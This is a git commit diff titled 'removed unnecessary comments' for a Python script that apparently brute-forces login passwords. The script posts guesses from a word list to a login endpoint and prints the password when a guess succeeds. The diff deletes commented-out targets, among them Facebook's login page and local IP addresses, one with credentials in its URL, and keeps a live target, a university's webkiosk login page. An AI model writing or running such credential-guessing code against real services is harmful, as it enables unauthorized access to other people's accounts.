b7fb5e4c1ea8982b8e696059f0f45929c9ca93d8
Abhishek Goyal <abhishek252167@gmail.com>
2020-06-23 15:38:34 +0530

    removed unnecessary comments

--- script2.py
+++ script2.py
@@ -1,14 +1,7 @@
-# python script.py username new_dict_words
-# for facebook-- sitename is : "https://www.facebook.com/login.php?login_attempt=1&lwv=110"
 import sys
 import requests
 from bs4 import BeautifulSoup as bs
 
-#url='https://www.facebook.com/login.php?login_attempt=1&lwv=110'
-#url='http://localhost/verify.php'
-#url ='http://qwerty:qwerty@172.16.8.84/ISAPI/Security/userCheck?timeStamp=1536863758325'
-#url='http://172.16.8.125/forms/doLogin'
-#url='https://172.31.1.6:8090/login.xml'
 url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'
 
 def connect(url,m_data):
@@ -22,13 +15,6 @@ def connect(url,m_data):
 		print("\nPassword is "+m_data["Password"])
 		sys.exit()
 	resp = requests.post(url,data=m_data)
-#	got_d=soup.find('p').get_text()
-#	if got_d=="CORRECT":
-#	print "The password is => "+m_data['pass']+ " <="
-#		sys.exit()
-#	else:
-#		print m_data['pass']+" not working"
-
 
 def controller():
 	m={}
